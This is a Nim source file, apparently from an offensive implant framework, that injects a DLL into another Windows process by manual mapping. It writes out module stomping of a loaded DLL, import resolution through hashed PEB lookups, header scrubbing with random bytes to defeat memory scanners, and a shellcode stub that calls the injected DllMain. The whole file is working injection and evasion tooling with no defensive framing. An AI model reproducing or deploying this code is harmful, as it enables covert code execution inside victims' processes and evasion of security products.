import winim
import ../core/syscalls, strutils, ../core/utils, ../core/resolver

proc rvaToOffset(pNtHeaders: PIMAGE_NT_HEADERS64, rva: uint32): uint32 =
    let pSectionHeader = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](
        cast[uint64](addr pNtHeaders.OptionalHeader) + cast[uint64](pNtHeaders.FileHeader.SizeOfOptionalHeader)
    )
    for i in 0 ..< int(pNtHeaders.FileHeader.NumberOfSections):
        let section = pSectionHeader[i]
        let v_start = cast[uint32](section.VirtualAddress)
        let v_size = cast[uint32](section.Misc.VirtualSize)
        if rva >= v_start and rva < (v_start + v_size):
            return rva - v_start + cast[uint32](section.PointerToRawData)
    return rva

proc find_sacrificial_module(hProcess: HANDLE, min_size: uint64): uint64 =
    # Enumerate modules in the target process
    var hMods: array[1024, HMODULE]
    var cbNeeded: DWORD
    if EnumProcessModules(hProcess, addr hMods[0], cast[DWORD](sizeof(hMods)), addr cbNeeded) != 0:
        let count = cast[int](cbNeeded) div sizeof(HMODULE)
        for i in 0 ..< count:
            var modInfo: MODULEINFO
            if GetModuleInformation(hProcess, hMods[i], addr modInfo, cast[DWORD](sizeof(modInfo))) != 0:
                if cast[uint64](modInfo.SizeOfImage) >= min_size:
                    # Avoid critical system DLLs
                    var modName: array[MAX_PATH, TCHAR]
                    if GetModuleBaseName(hProcess, hMods[i], addr modName[0], MAX_PATH) != 0:
                        let name = $cast[WideCString](addr modName[0])
                        let lowerName = name.toLowerAscii()
                        # Avoid main EXE and critical DLLs
                        if i > 0 and lowerName notin ["ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll", "ws2_32.dll", "user32.dll", "gdi32.dll", "msvcrt.dll"]:
                            log_debug("[manual_map] Found sacrificial module: " & name & " base: 0x" & cast[uint](hMods[i]).toHex())
                            return cast[uint64](hMods[i])
    return 0

proc manual_map*(hProcess: HANDLE, dll_buffer: pointer, stomp: bool = false): uint64 =
    log_debug("[manual_map] ENTERED")
    let pDosHeader = cast[PIMAGE_DOS_HEADER](dll_buffer)
    let pNtHeaders = cast[PIMAGE_NT_HEADERS64](cast[uint64](dll_buffer) + cast[uint64](pDosHeader.e_lfanew))
    let imageSize = pNtHeaders.OptionalHeader.SizeOfImage
    let preferredBase = pNtHeaders.OptionalHeader.ImageBase

    var pTargetBase: pointer = nil
    var sz: SIZE_T = imageSize.SIZE_T

    if stomp:
        log_debug("[manual_map] Attempting Module Stomping...")
        let stomped_addr = find_sacrificial_module(hProcess, cast[uint64](imageSize))
        if stomped_addr != 0:
            pTargetBase = cast[pointer](stomped_addr)
            # Fling target module permissions to RW
            var base_ptr = pTargetBase
            var size_copy = cast[SIZE_T](imageSize)
            var old_protect: ULONG
            discard NtProtectVirtualMemory(hProcess, addr base_ptr, addr size_copy, PAGE_READWRITE.ULONG, addr old_protect)
            log_debug("[manual_map] Successfully stomped module at 0x" & stomped_addr.toHex())
        else:
            log_debug("[manual_map] Module Stomping FAILED (no suitable module found), falling back to allocation.")
            discard

    # 1. Allocate memory for Image (Start as RW)
    if pTargetBase == nil:
        log_debug("[manual_map] Allocating 0x" & imageSize.toHex() & " bytes")
        var status = NtAllocateVirtualMemory(hProcess, addr pTargetBase, 0, addr sz, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        if status != 0: 
            log_debug("[manual_map] Allocation FAILED: 0x" & cast[uint32](status).toHex())
            return 0
    log_debug("[manual_map] Target base: 0x" & cast[uint](pTargetBase).toHex())

    let delta = cast[int64](cast[uint64](pTargetBase) - cast[uint64](preferredBase))
    var bytesRead, bytesWritten: SIZE_T

    # 2. Copy Headers & Sections
    log_debug("[manual_map] Copying Headers...")
    discard NtWriteVirtualMemory(hProcess, pTargetBase, dll_buffer, pNtHeaders.OptionalHeader.SizeOfHeaders, addr bytesWritten)
    
    log_debug("[manual_map] Copying Sections...")
    var pSectionHeader = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](
        cast[uint64](addr pNtHeaders.OptionalHeader) + cast[uint64](pNtHeaders.FileHeader.SizeOfOptionalHeader)
    )
    for i in 0 ..< int(pNtHeaders.FileHeader.NumberOfSections):
        let section = pSectionHeader[i]
        if section.SizeOfRawData > 0:
            let remoteDest = cast[pointer](cast[uint64](pTargetBase) + cast[uint64](section.VirtualAddress))
            let localSrc = cast[pointer](cast[uint64](dll_buffer) + cast[uint64](section.PointerToRawData))
            discard NtWriteVirtualMemory(hProcess, remoteDest, localSrc, section.SizeOfRawData, addr bytesWritten)

    # 3. Base Relocation
    log_debug("[manual_map] Applying Relocations...")
    let relocDir = pNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
    if relocDir.Size > 0:
        # Walk the relocation blocks directly from the raw file buffer (file offset)
        let relocFileOffset = rvaToOffset(pNtHeaders, cast[uint32](relocDir.VirtualAddress))
        let relocBase = cast[uint64](dll_buffer) + cast[uint64](relocFileOffset)
        var currentOffsetInDir = 0.uint64
        while currentOffsetInDir < cast[uint64](relocDir.Size):
            let pReloc = cast[ptr IMAGE_BASE_RELOCATION](relocBase + currentOffsetInDir)
            if pReloc.VirtualAddress == 0 or pReloc.SizeOfBlock == 0: break
            
            let count = (cast[uint32](pReloc.SizeOfBlock) - cast[uint32](sizeof(IMAGE_BASE_RELOCATION))) div 2
            let pEntry = cast[ptr UncheckedArray[uint16]](cast[uint64](pReloc) + cast[uint64](sizeof(IMAGE_BASE_RELOCATION)))
            
            for i in 0 ..< int(count):
                let typeOffset = pEntry[i]
                let offset = typeOffset and 0xFFF
                let relocType = typeOffset shr 12
                if relocType == IMAGE_REL_BASED_DIR64:
                    # Calculate: remote target base + block's VirtualAddress + entry offset
                    let remoteAddr = cast[pointer](
                        cast[uint64](pTargetBase) + cast[uint64](pReloc.VirtualAddress) + cast[uint64](offset)
                    )
                    # Read original value from remote, adjust for delta, write back
                    var origValue: uint64
                    discard NtReadVirtualMemory(hProcess, remoteAddr, addr origValue, sizeof(uint64).SIZE_T, addr bytesRead)
                    let newValue = cast[uint64](cast[int64](origValue) + delta)
                    discard NtWriteVirtualMemory(hProcess, remoteAddr, addr newValue, sizeof(uint64).SIZE_T, addr bytesWritten)
            currentOffsetInDir += cast[uint64](pReloc.SizeOfBlock)

    # 4. Resolve IAT
    let importDir = pNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    if importDir.Size > 0:
        log_debug("[manual_map] Resolving IAT...")
        
        # Resolve LoadLibraryA and GetProcAddress via PEB to avoid IAT issues
        let k32 = get_module_base(hash_api("kernel32.dll"))
        if k32 == nil:
            log_debug("[manual_map] CRITICAL: Could not find kernel32.dll in PEB")
            return 0
            
        type tLoadLibraryA = proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.}
        type tGetProcAddress = proc(hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
        
        let pLoadLibraryA = cast[tLoadLibraryA](get_proc_address_hashed(k32, hash_api("LoadLibraryA")))
        let pGetProcAddress = cast[tGetProcAddress](get_proc_address_hashed(k32, hash_api("GetProcAddress")))
        
        if pLoadLibraryA == nil or pGetProcAddress == nil:
            log_debug("[manual_map] CRITICAL: Could not resolve LoadLibraryA/GetProcAddress from PEB")
            return 0

        log_debug("[manual_map] Resolved LoadLibraryA: 0x" & cast[uint](pLoadLibraryA).toHex())
        log_debug("[manual_map] Resolved GetProcAddress: 0x" & cast[uint](pGetProcAddress).toHex())

        let importOffset = rvaToOffset(pNtHeaders, cast[uint32](importDir.VirtualAddress))
        var pImportDesc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[uint64](dll_buffer) + cast[uint64](importOffset))
        
        while cast[uint32](pImportDesc.Name) != 0:
            let libName = (cast[cstring](cast[uint64](dll_buffer) + cast[uint64](rvaToOffset(pNtHeaders, cast[uint32](pImportDesc.Name)))))
            log_debug("[manual_map] Loading library: " & $libName)
            let hLib = pLoadLibraryA(libName)
            if hLib == 0:
                log_debug("[manual_map] CRITICAL: pLoadLibraryA failed for " & $libName)
                return 0
            
            let ftOffset = rvaToOffset(pNtHeaders, cast[uint32](pImportDesc.FirstThunk))
            let oftOffset = if cast[uint32](pImportDesc.union1.OriginalFirstThunk) != 0: rvaToOffset(pNtHeaders, cast[uint32](pImportDesc.union1.OriginalFirstThunk)) else: ftOffset

            var pThunk = cast[ptr UncheckedArray[uint64]](cast[uint64](dll_buffer) + cast[uint64](ftOffset))
            var pOriginalThunk = cast[ptr UncheckedArray[uint64]](cast[uint64](dll_buffer) + cast[uint64](oftOffset))

            var i = 0
            while pThunk[i] != 0:
                let remoteThunkAddr = cast[pointer](cast[uint64](pTargetBase) + cast[uint64](pImportDesc.FirstThunk) + cast[uint64](i * 8))
                if (pOriginalThunk[i] and 0x8000000000000000.uint64) != 0:
                    let ordinal = pOriginalThunk[i] and 0xFFFF
                    let funcAddr = pGetProcAddress(hLib, cast[LPCSTR](ordinal))
                    discard NtWriteVirtualMemory(hProcess, remoteThunkAddr, addr funcAddr, sizeof(pointer).SIZE_T, addr bytesWritten)
                else:
                    let pImportByName = cast[PIMAGE_IMPORT_BY_NAME](cast[uint64](dll_buffer) + cast[uint64](rvaToOffset(pNtHeaders, cast[uint32](pOriginalThunk[i]))))
                    let funcName = cast[cstring](addr pImportByName.Name)
                    let funcAddr = pGetProcAddress(hLib, funcName)
                    if funcAddr == nil:
                        log_debug("[manual_map] CRITICAL: Could not resolve " & $funcName)
                        return 0
                    discard NtWriteVirtualMemory(hProcess, remoteThunkAddr, addr funcAddr, sizeof(pointer).SIZE_T, addr bytesWritten)
                i.inc
            pImportDesc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[uint64](pImportDesc) + cast[uint64](sizeof(IMAGE_IMPORT_DESCRIPTOR)))

    # 5. Finalize Protections (RW -> RX/R/RW)
    log_debug("[manual_map] Finalizing Protections...")
    for i in 0 ..< int(pNtHeaders.FileHeader.NumberOfSections):
        let section = pSectionHeader[i]
        var sectionProtect: uint32 = PAGE_READONLY
        let executable = (section.Characteristics and IMAGE_SCN_MEM_EXECUTE) != 0
        let readable = (section.Characteristics and IMAGE_SCN_MEM_READ) != 0
        let writeable = (section.Characteristics and IMAGE_SCN_MEM_WRITE) != 0

        if executable:
            if writeable: sectionProtect = PAGE_EXECUTE_READWRITE
            elif readable: sectionProtect = PAGE_EXECUTE_READ
            else: sectionProtect = PAGE_EXECUTE
        else:
            if writeable: sectionProtect = PAGE_READWRITE
            elif readable: sectionProtect = PAGE_READONLY
            else: sectionProtect = PAGE_NOACCESS

        var sectionAddr = cast[pointer](cast[uint64](pTargetBase) + cast[uint64](section.VirtualAddress))
        var sectionSize = cast[SIZE_T](section.Misc.VirtualSize)
        var oldProtect: ULONG
        let st = NtProtectVirtualMemory(hProcess, addr sectionAddr, addr sectionSize, cast[ULONG](sectionProtect), addr oldProtect)
        if st != 0:
            log_debug("[manual_map] WARNING: Failed to protect section " & $i & " NTSTATUS: 0x" & cast[uint32](st).toHex())
            discard

    # 6. Scrub PE Headers with random bytes (remove MZ/PE signature from memory scanner)
    var randBuf = newSeq[byte](pNtHeaders.OptionalHeader.SizeOfHeaders.int)
    let tick = cast[uint32](GetTickCount64())
    for i in 0..<randBuf.len:
        randBuf[i] = cast[byte](((tick xor cast[uint32](cast[uint64](i) * 6364136223846793005'u64)) shr 16) and 0xFF)
    discard NtWriteVirtualMemory(hProcess, pTargetBase, addr randBuf[0], pNtHeaders.OptionalHeader.SizeOfHeaders.SIZE_T, addr bytesWritten)

    # 7. Inject Shellcode Stub to call DllMain
    let realEntryPoint = cast[uint64](pTargetBase) + cast[uint64](pNtHeaders.OptionalHeader.AddressOfEntryPoint)
    var stub: array[39, byte] = [
      0x48.byte, 0x83, 0xEC, 0x28,                     # sub rsp, 40
      0x48, 0xB9, 0,0,0,0,0,0,0,0,                     # mov rcx, Base (Value at 6)
      0xBA, 0x01, 0x00, 0x00, 0x00,                    # mov edx, 1
      0x45, 0x31, 0xC0,                                # xor r8d, r8d
      0x48, 0xB8, 0,0,0,0,0,0,0,0,                     # mov rax, Entry (Value at 24)
      0xFF, 0xD0,                                      # call rax
      0x48, 0x83, 0xC4, 0x28,                          # add rsp, 40
      0xC3                                             # ret
    ]
    cast[ptr uint64](addr stub[6])[] = cast[uint64](pTargetBase)
    cast[ptr uint64](addr stub[24])[] = realEntryPoint

    var pStub: pointer = nil
    var stubSz: SIZE_T = sizeof(stub).SIZE_T
    if NtAllocateVirtualMemory(hProcess, addr pStub, 0, addr stubSz, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) == 0:
        if NtWriteVirtualMemory(hProcess, pStub, addr stub[0], sizeof(stub).SIZE_T, addr bytesWritten) == 0:
            var oldProt: ULONG
            var protAddr = pStub
            var protSz = stubSz
            if NtProtectVirtualMemory(hProcess, addr protAddr, addr protSz, PAGE_EXECUTE_READ, addr oldProt) == 0:
                log_debug("[manual_map] Loader Stub at 0x" & cast[uint64](pStub).toHex())
                return cast[uint64](pStub)
    return 0
